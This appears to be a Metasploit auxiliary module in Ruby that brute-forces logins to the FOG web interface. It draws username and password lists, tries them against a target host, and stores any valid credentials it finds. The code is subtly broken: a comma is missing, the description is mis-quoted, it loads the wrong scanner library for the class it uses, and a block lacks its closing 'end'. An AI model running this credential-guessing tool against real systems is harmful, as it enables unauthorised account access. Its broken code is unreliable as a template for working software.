##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/login_scanner/symantec_web_gateway'
require 'metasploit/framework/credential_collection'

class MetasploitModule < Msf::Auxiliary
    include Msf::Exploit::Remote::HttpClient
    include Msf::Auxiliary::AuthBrute
    include Msf::Auxiliary::Report
    include Msf::Auxiliary::Scanner
    
    def initialize(info={})
        super(update_info(info,
            'Name' => 'FOG Web Interface Login',
            'Description' => '%q{
                Attempt to log in to the FOG web interface.
            }',
            'Author' => [ 'jkollross' ]
            'License' => MSF_LICENSE,
            'DefaultOptions' => {
                'RPORT' => 80,
                'SSL' => false,
            }))
    end

    def scanner(ip)
        @scanner ||= lambda {
            cred_collection = Metasploit::Framework::CredentialCollection.new(
                blank_passwords: datastore['BLANK_PASSWORDS'],
                pass_file:       datastore['PASS_FILE'],
                password:        datastore['PASSWORD'],
                user_file:       datastore['USER_FILE'],
                userpass_file:   datastore['USERPASS_FILE'],
                username:        datastore['USERNAME'],
                user_as_pass:    datastore['USER_AS_PASS']
            )
            return Metasploit::Framework::LoginScanner::FogWebInterface.new(configure_http_login_scanner(
                host: ip,
                port: datastore['RPORT'],
                cred_details:       cred_collection,
                stop_on_success:    datastore['STOP_ON_SUCCESS'],
                bruteforce_speed:   datastore['BRUTEFORCE_SPEED'],
                connection_timeout: 5
              ))
        }.call
    end

    def bruteforce(ip)
        scanner(ip).scan! do |result|
            case result.status
            when Metasploit::Model::Login::Status::SUCCESSFUL
                print_brute(:level => :good, :ip => ip, :msg => "Success: '#{result.credential}'")
                store_valid_credential(
                    user: result.credential.public,
                    private: result.credential.private,
                    private_type: :password,
                    proof: nil
                )
            when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
                vprint_brute(:level => :verror, :ip => ip, :msg => result.proof)
                invalidate_login(
                    address: ip,
                    port: rport,
                    protocol: 'tcp',
                    public: result.credential.public,
                    private: result.credential.private,
                    realm_key: result.credential.realm_key,
                    realm_value: result.credential.realm,
                    status: result.status,
                    proof: result.proof
                )
            when Metasploit::Model::Login::Status::INCORRECT
                vprint_brute(:level => :verror, :ip => ip, :msg => "Failed: '#{result.credential}'")
                invalidate_login(
                    address: ip,
                    port: rport,
                    protocol: 'tcp',
                    public: result.credential.public,
                    private: result.credential.private,
                    realm_key: result.credential.realm_key,
                    realm_value: result.credential.realm,
                    status: result.status,
                    proof: result.proof
                )
            end
    end
    
    def run_host(ip)
        unless scanner(ip).check_setup
            print_brute(:level => :error, :ip => ip, :msg => 'Incorrect Target')
            return
        end
        bruteforce(ip)
    end
end